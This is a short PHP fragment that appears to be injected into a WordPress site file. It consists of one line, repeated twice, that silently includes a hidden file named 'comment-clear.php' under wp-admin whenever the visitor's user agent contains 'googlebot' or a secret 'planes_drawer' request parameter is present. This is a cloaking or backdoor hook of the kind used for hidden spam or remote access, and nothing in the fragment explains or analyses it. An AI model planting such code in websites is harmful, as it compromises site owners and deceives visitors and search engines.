...
if (strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),"googlebot") !== false or isset($_REQUEST["planes_drawer"]) ){@include(dirname(__FILE__) . "/../wp-admin/user/comment-clear.php");}if (strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),"googlebot") !== false or isset($_REQUEST["planes_drawer"]) ){@include(dirname(__FILE__) . "/../wp-admin/user/comment-clear.php");}